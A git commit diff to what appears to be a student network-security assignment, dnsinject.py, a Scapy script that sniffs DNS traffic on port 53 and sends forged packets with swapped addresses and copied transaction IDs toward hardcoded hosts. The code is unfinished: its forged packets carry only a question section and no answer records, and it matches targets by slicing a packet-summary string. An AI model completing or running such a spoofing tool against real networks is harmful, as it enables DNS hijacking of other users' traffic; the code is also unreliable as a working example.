1fb65a0504ba00beddc46cabddb24614a18611ec
nicholasqnguyen8 <nicholasqnguyen8@gmail.com>
2021-12-17 00:58:18 -0500

    Well, made some progress maybe? I'll come back tomorrow

--- Assignment_4/dnsinject.py
+++ Assignment_4/dnsinject.py
@@ -1,45 +1,48 @@
 # https://thepacketgeek.com/scapy/sniffing-custom-actions/part-1/
 # https://www.exploit-db.com/docs/48606
-from scapy import packet
-# from scapy.all import IP, UDP, DNS, DNSQR, sniff, send
 from scapy.all import *
-import socket
 import sys
 
-ipSrcList = []
-ipDstList = []
+packetList = []
+
 
 def querySniff(packet):
-    dr0 = IP(src=packet[IP].dst,dst=packet[IP].src) /\
-        UDP(sport=packet[UDP].sport, dport=53) /\
-        DNS(id= packet[DNS].id, rd=1, qd=DNSQR(qname="example.com"))
+    packetList.append(packet)
+    # Just hardcode in the values from hostnames for testing
+    # If it's one of the packets we're trying to intercept, send
+    # our interception packet
+    # String slice to get just the dst ip
+    if packet.summary()[30:38] == "10.6.6.6":
+        dr0 = IP(src=packet[IP].dst, dst=packet[IP].src) /\
+            UDP(sport=packet[UDP].sport, dport=53) /\
+            DNS(id=packet[DNS].id, rd=1, qd=DNSQR(qname="foo.example.com"))
+        send(dr0)
+    elif packet.summary()[30:38] == "10.6.6.7":
+        dr0 = IP(src=packet[IP].dst, dst=packet[IP].src) /\
+            UDP(sport=packet[UDP].sport, dport=53) /\
+            DNS(id=packet[DNS].id, rd=1, qd=DNSQR(qname="bar.example.com"))
+        send(dr0)
 
-    send(dr0)
 
 def main(interface="wlp2s0", hostnames="hostnames"):
-    
-    # https://www.w3schools.com/python/python_file_open.asp
-    f = open(hostnames, "r")
-    for word in f:
-        print(word)
-    
+
     print("Working...")
-        # https://www.geeksforgeeks.org/packet-sniffing-using-scapy/
-        # https://stackoverflow.com/questions/24792462/python-scapy-dns-sniffer-and-parser
-        # https://null-byte.wonderhowto.com/how-to/build-dns-packet-sniffer-with-scapy-and-python-0163601/
+    # https://www.geeksforgeeks.org/packet-sniffing-using-scapy/
+    # https://stackoverflow.com/questions/24792462/python-scapy-dns-sniffer-and-parser
+    # https://null-byte.wonderhowto.com/how-to/build-dns-packet-sniffer-with-scapy-and-python-0163601/
     for i in range(5):
-        # capture = sniff(iface = interface, filter = "port 53",
-        #     prn = querySniff, store = 0, count = 1)
-        capture = sniff(iface = interface, filter = "port 53", 
-             count = 1, prn = querySniff)
+        capture = sniff(iface=interface, filter="port 53",
+                        count=1, prn=querySniff)
 
         print("CAPTURE: ", capture)
     print("Done sniffing")
 
+    dr0 = IP(src=packetList[0][IP].dst, dst=packetList[0][IP].src) /\
+        UDP(sport=packetList[0][UDP].sport, dport=53) /\
+        DNS(id=packetList[0][DNS].id, rd=1, qd=DNSQR(qname="example.com"))
+    send(dr0)
+
+
 if __name__ == "__main__":
     # Take in command line arguments and pass onto main
-    # main(sys.argv[1], sys.argv[2])
-
-    # TODO remove before final implementation
-    # Temporary main for testing purposes
-    main("wlp2s0", "hostnames")
+    main(sys.argv[1], sys.argv[2])
